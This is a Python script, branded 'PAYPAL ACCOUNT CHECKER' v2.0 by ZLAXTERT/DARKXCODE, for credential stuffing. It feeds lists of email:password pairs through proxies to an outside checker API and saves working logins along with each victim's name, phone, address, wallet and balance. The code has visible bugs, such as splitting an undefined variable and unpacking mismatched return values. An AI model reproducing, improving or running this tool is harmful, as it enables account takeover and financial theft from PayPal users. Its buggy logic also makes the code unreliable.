# UPDATE   : 23 JAN 2025
# SCRIPT   : PAYPAL ACCOUNT CHECKER
# VERSION  : 2.0
# TELEGRAM : https://t.me/zlaxtert
# OWNER    : ZLAXTERT
# CODE BY  : ZLAXTERT
# GITHUB   : https://github.com/zlaxtertdev
# NOTE     : PLEASE DONT CHANGE THIS

import os
import json
import time
import random
import requests
import configparser
from datetime import datetime
from urllib.parse import quote

class PayPalChecker:
    DEFAULT_COLORS = {
        "GR": "\033[32;1m",
        "RD": "\033[31;1m",
        "BL": "\033[34;1m",
        "YL": "\033[33;1m",
        "CY": "\033[36;1m",
        "MG": "\033[35;1m",
        "WH": "\033[37;1m",
        "DEF": "\033[0m"
    }

    def __init__(self):
        self.config = self.load_config()
        self.colors = self.load_colors()
        
    def load_config(self):
        config = configparser.ConfigParser()
        # Set default values first
        config['SETTINGS'] = {
            'mode_proxy': 'off',
            'proxy_list': 'proxy.txt',
            'proxy_type': 'http',
            'proxy_pwd': '',
            'thisApikey': 'apikey1,apikey2',
            'thisApi': 'https://api.example.com'
        }
        config['COLORS'] = self.DEFAULT_COLORS
        
        # Read config file if exists
        if os.path.exists('settings.ini'):
            config.read('settings.ini')
        else:
            # Create default config file if not exists
            with open('settings.ini', 'w') as configfile:
                config.write(configfile)
        
        return config
        
    def load_colors(self):
        colors = self.DEFAULT_COLORS.copy()
        if 'COLORS' in self.config:
            for key, value in self.config['COLORS'].items():
                if key in colors:
                    colors[key] = value.replace('\\033', '\033')
        return colors
        
    def color_text(self, text, color):
        color_code = self.colors.get(color, self.colors['DEF'])
        return f"{color_code}{text}{self.colors['DEF']}"
    
    def bannerPP(self):
        return f"""
{self.color_text("        PAYPAL ACCOUNT CHECKER", "GR")}
{self.color_text("        VERSION : 2.0", "YL")}
{self.color_text("        TELEGRAM: t.me/zlaxtert", "CY")}
{self.color_text("        BY      : DARKXCODE", "MG")}
"""
    
    def banner2(self):
        return self.color_text( "-" * 40, "WH")
    
    def current_time(self):
        return datetime.now().strftime("%H:%M:%S")
    
    def current_date(self):
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    def ratio_check(self, success, total):
        return (success / total) * 100 if total > 0 else 0
    
    def multi_explode(self, delimiters, string):
        for delimiter in delimiters[1:]:
            string = string.replace(delimiter, delimiters[0])
        return string.split(delimiters[0])
    
    def get_proxy(self):
        if self.config['SETTINGS'].get('mode_proxy', 'off').lower() != 'on':
            return ""
            
        proxy_file = self.config['SETTINGS'].get('proxy_list', 'proxy.txt')
        if not os.path.exists(proxy_file):
            return ""
            
        with open(proxy_file, "r") as f:
            proxies = f.read().splitlines()
        return random.choice(proxies) if proxies else ""
    
    def get_apikey(self):
        apikeys = self.config['SETTINGS'].get('thisApikey', '').split(',')
        return random.choice([ak.strip() for ak in apikeys if ak.strip()])
    
    def save_file(self, filename, content):
        os.makedirs("result", exist_ok=True)
        with open(f"result/{filename}", "a", encoding='utf-8') as f:
            f.write(content + "\n")
    
    def process_account(self, email, passw):
        proxies = self.get_proxy()
        apikey = self.get_apikey()
        base_api = self.config['SETTINGS'].get('thisApi', '')
        
        api_url = f"{base_api}/checker/paypal/?apikey={apikey}&list={quote(email)}:{quote(passw)}"
        
        if self.config['SETTINGS'].get('mode_proxy', 'off').lower() == 'on':
            api_url += f"&proxy={proxies}&proxyAuth={self.config['SETTINGS'].get('proxy_pwd', '')}&type_proxy={self.config['SETTINGS'].get('proxy_type', 'http')}"
        
        try:
            response = requests.get(api_url, timeout=30)
            if not response.ok:
                return "error", "CONNECTION ERROR"
            
            data = response.json().get("data", {})
            msg = data.get("msg", "UNKNOWN RESPONSE")
            status = data.get("status", "die")
            acc_type = data.get("type", "unknown")
            
            return acc_type, msg, status, data.get("info", {})
        
        except Exception as e:
            return "error", str(e)
    
    def run(self):
        print(self.banner2())
        print(self.bannerPP())
        print(self.banner2())

        # CREATE FOLDER RESULT
        if not os.path.exists('result'):
            os.makedirs('result', mode=0o777, exist_ok=True)
        
        while True:
            listname = input(f"{self.colors['WH']} [{self.colors['GR']}+{self.colors['WH']}] Your file ({self.colors['YL']}example.txt{self.colors['WH']}) {self.colors['GR']}>> {self.colors['BL']}")
            if not listname or not os.path.exists(listname):
                print(f"\n\n{self.colors['WH']} [{self.colors['YL']}!{self.colors['WH']}]{self.colors['RD']} FILE NOT FOUND{self.colors['WH']} [{self.colors['YL']}!{self.colors['WH']}]{self.colors['DEF']}\n\n")
                continue
            break
        
        try:
            with open(listname, "r", encoding='utf-8') as f:
                lists = list(set(line.strip() for line in f.readlines() if line.strip()))
        except Exception as e:
            print(f"{self.colors['RD']}Error reading file: {e}{self.colors['DEF']}")
            return
        
        total = len(lists)
        stats = {
            "live": 0, "valid_email": 0, "limit": 0,
            "error": 0, "die": 0, "unknown": 0
        }
        
        print(f"\n\n{self.colors['WH']} [{self.colors['YL']}!{self.colors['WH']}] TOTAL {self.colors['GR']}{total}{self.colors['WH']} LISTS [{self.colors['YL']}!{self.colors['WH']}]{self.colors['DEF']}\n\n")
        
        for no, line in enumerate(lists, 1):
            if not line:
                continue
            
            try:
                if ":" in line:
                    splitmail = email.split(":")
                    email = splitmail[0]
                    passw = splitmail[1]
                elif "|" in line:
                    splitmail = line.split("|")
                    email = splitmail[0]
                    passw = splitmail[1]
                elif "/" in line:
                    splitmail = line.split("/")
                    email = splitmail[0]
                    passw = splitmail[1]
                else :
                    email = email
                    passw = passw
                
                if not email or not passw:
                    stats["error"] += 1
                    self.save_file("error.txt", line)
                    print(f"{self.colors['WH']} [{self.colors['YL']}{self.current_time()}{self.colors['WH']}][{self.colors['RD']}{no}{self.colors['DEF']}/{self.colors['GR']}{total}{self.colors['DEF']}]{self.colors['MG']} INVALID FORMAT{self.colors['DEF']} =>{self.colors['BL']} {line}{self.colors['DEF']} | BY{self.colors['CY']} DARKXCODE{self.colors['DEF']} (V2.0)")
                    continue
                
                acc_type, msg, status, info = self.process_account(email, passw)
                current_jam = self.current_time()
                
                if msg == "SUCCESS LOGIN!":
                    stats["live"] += 1
                    output = f"""
========================[{msg}]==========================
    DATE     : {self.current_date()} 
    EMAIL    : {info.get('email', '')}
    PASSWORD : {passw}
    [INFO ACCOUNT]
    NAME     : {info.get('name', '')}
    PHONE    : {info.get('phone', '')}
    ADDRESS  : {info.get('billing_address', '')}
    CITY     : {info.get('city', '')}
    STATE    : {info.get('state', '')}
    POSTCODE : {info.get('postcode', '')}
    COUNTRY  : {info.get('country', '')}
    WALLET   : {info.get('wallet', '')}
    BALANCE  : {info.get('ballance', '')}
=========================================================
"""
                    self.save_file("success-log.txt", f"{email}:{passw}")
                    self.save_file("info-success-log.txt", output)
                    print(f"{self.colors['WH']} [{self.colors['YL']}{current_jam}{self.colors['WH']}][{self.colors['RD']}{no}{self.colors['DEF']}/{self.colors['GR']}{total}{self.colors['DEF']}]{self.colors['GR']} SUCCESS LOGIN{self.colors['DEF']} =>{self.colors['BL']} {email}:{passw}{self.colors['DEF']} | [{self.colors['YL']} MSG{self.colors['DEF']}: {self.colors['CY']}{msg}{self.colors['DEF']} ] | BY{self.colors['MG']} DARKXCODE{self.colors['DEF']} (V2.0)")
                
                elif msg == "VALID EMAIL ADDRESS!":
                    stats["valid_email"] += 1
                    self.save_file("valid-email.txt", f"{email}:{passw}")
                    print(f"{self.colors['WH']} [{self.colors['YL']}{current_jam}{self.colors['WH']}][{self.colors['RD']}{no}{self.colors['DEF']}/{self.colors['GR']}{total}{self.colors['DEF']}]{self.colors['YL']} VALID EMAIL{self.colors['DEF']} =>{self.colors['BL']} {email}:{passw}{self.colors['DEF']} | [{self.colors['YL']} MSG{self.colors['DEF']}:{self.colors['MG']} VALID EMAIL ADDRESS!{self.colors['DEF']} ] | BY{self.colors['CY']} DARKXCODE{self.colors['DEF']} (V2.0)")
                
                elif msg == "INVALID COOKIES!":
                    stats["limit"] += 1
                    self.save_file("limit.txt", f"{email}:{passw}")
                    print(f"{self.colors['WH']} [{self.colors['YL']}{current_jam}{self.colors['WH']}][{self.colors['RD']}{no}{self.colors['DEF']}/{self.colors['GR']}{total}{self.colors['DEF']}]{self.colors['CY']} LIMIT LOGIN{self.colors['DEF']} =>{self.colors['BL']} {email}:{passw}{self.colors['DEF']} | [{self.colors['YL']} MSG{self.colors['DEF']}:{self.colors['MG']} SECURITY CHALLENGE!{self.colors['DEF']} ] | BY{self.colors['CY']} DARKXCODE{self.colors['DEF']} (V2.0)")
                
                elif msg == "SECURITY CHALLENGE!":
                    stats["limit"] += 1
                    self.save_file("limit.txt", f"{email}:{passw}")
                    print(f"{self.colors['WH']} [{self.colors['YL']}{current_jam}{self.colors['WH']}][{self.colors['RD']}{no}{self.colors['DEF']}/{self.colors['GR']}{total}{self.colors['DEF']}]{self.colors['CY']} LIMIT LOGIN{self.colors['DEF']} =>{self.colors['BL']} {email}:{passw}{self.colors['DEF']} | [{self.colors['YL']} MSG{self.colors['DEF']}:{self.colors['MG']} SECURITY CHALLENGE!{self.colors['DEF']} ] | BY{self.colors['CY']} DARKXCODE{self.colors['DEF']} (V2.0)")

                elif msg == "unknown":
                    stats["unknown"] += 1
                    self.save_file("unknown.txt", f"{email}:{passw}")
                    print(f"{self.colors['WH']} [{self.colors['YL']}{current_jam}{self.colors['WH']}][{self.colors['RD']}{no}{self.colors['DEF']}/{self.colors['GR']}{total}{self.colors['DEF']}]{self.colors['WH']} UNKNOWN{self.colors['DEF']} =>{self.colors['BL']} {email}:{passw}{self.colors['DEF']} | [{self.colors['YL']} MSG{self.colors['DEF']}:{self.colors['MG']} UNKNOWN RESPONSE!{self.colors['DEF']} ] | BY{self.colors['CY']} DARKXCODE{self.colors['DEF']} (V2.0)")
                
                elif status == "die":
                    stats["die"] += 1
                    self.save_file(f"{msg}.txt", f"{email}:{passw}")
                    print(f"{self.colors['WH']} [{self.colors['YL']}{current_jam}{self.colors['WH']}][{self.colors['RD']}{no}{self.colors['DEF']}/{self.colors['GR']}{total}{self.colors['DEF']}]{self.colors['RD']} DIE{self.colors['DEF']} =>{self.colors['BL']} {email}:{passw}{self.colors['DEF']} | [{self.colors['YL']} MSG{self.colors['DEF']}:{self.colors['MG']} {msg}{self.colors['DEF']} ] | BY{self.colors['CY']} DARKXCODE{self.colors['DEF']} (V2.0)")
                
                elif "proxy limit" in msg.lower():
                    stats["die"] += 1
                    self.save_file("proxy-limit.txt", f"{email}:{passw}")
                    print(f"{self.colors['WH']} [{self.colors['YL']}{current_jam}{self.colors['WH']}][{self.colors['RD']}{no}{self.colors['DEF']}/{self.colors['GR']}{total}{self.colors['DEF']}]{self.colors['RD']} DIE{self.colors['DEF']} =>{self.colors['BL']} {email}:{passw}{self.colors['DEF']} | [{self.colors['YL']} MSG{self.colors['DEF']}:{self.colors['MG']} PROXY LIMIT OR NOT SUPPORT!{self.colors['DEF']} ] | BY{self.colors['CY']} DARKXCODE{self.colors['DEF']} (V2.0)")
                
                elif msg == "Proxy is dead or proxy type is wrong!":
                    stats["die"] += 1
                    self.save_file("proxy-limit.txt", f"{email}:{passw}")
                    print(f"{self.colors['WH']} [{self.colors['YL']}{current_jam}{self.colors['WH']}][{self.colors['RD']}{no}{self.colors['DEF']}/{self.colors['GR']}{total}{self.colors['DEF']}]{self.colors['RD']} DIE{self.colors['DEF']} =>{self.colors['BL']} {email}:{passw}{self.colors['DEF']} | [{self.colors['YL']} MSG{self.colors['DEF']}:{self.colors['MG']} PROXY LIMIT OR NOT SUPPORT!{self.colors['DEF']} ] | BY{self.colors['CY']} DARKXCODE{self.colors['DEF']} (V2.0)")
                
                else:
                    stats["error"] += 1
                    self.save_file("error.txt", f"{email}:{passw}")
                    print(f"{self.colors['WH']} [{self.colors['YL']}{current_jam}{self.colors['WH']}][{self.colors['RD']}{no}{self.colors['DEF']}/{self.colors['GR']}{total}{self.colors['DEF']}]{self.colors['MG']} ERROR{self.colors['DEF']} =>{self.colors['BL']} {email}:{passw}{self.colors['DEF']} | [{self.colors['YL']} MSG{self.colors['DEF']}:{self.colors['MG']} {msg}{self.colors['DEF']} ] | BY{self.colors['CY']} DARKXCODE{self.colors['DEF']} (V2.0)")
            
            except Exception as e:
                stats["error"] += 1
                print(f"{self.colors['RD']}Error processing line {no}: {e}{self.colors['DEF']}")
                continue
        
        print("\n================[DONE]================")
        print(f" DATE          : {self.current_date()}")
        print(f" SUCCESS LOGIN : {stats['live']}")
        print(f" VALID EMAIL   : {stats['valid_email']}")
        print(f" DIE           : {stats['die']}")
        print(f" UNKNOWN       : {stats['unknown']}")
        print(f" LIMIT         : {stats['limit']}")
        print(f" ERROR         : {stats['error']}")
        print(f" TOTAL         : {total}")
        print("======================================")
        print(f"[+] RATIO SUCCESS LOGIN => {self.colors['GR']}{round(self.ratio_check(stats['live'], total), 2)}%{self.colors['DEF']}")
        print(f"[+] RATIO VALID EMAIL   => {self.colors['YL']}{round(self.ratio_check(stats['valid_email'], total), 2)}%{self.colors['DEF']}")
        print(f"[+] RATIO LIMIT         => {self.colors['CY']}{round(self.ratio_check(stats['limit'], total), 2)}%{self.colors['DEF']}\n")
        print("[!] NOTE : CHECK AGAIN FILE 'unknown.txt' or 'limit.txt' or 'error.txt' [!]")
        print(f"This file '{listname}'")
        print("File saved in folder 'result/' \n")

if __name__ == "__main__":
    try:
        checker = PayPalChecker()
        checker.run()
    except KeyboardInterrupt:
        print("\n[!] Process interrupted by user [!] \n\n")
    except Exception as e:
        print(f"\n[!] Error: {e}")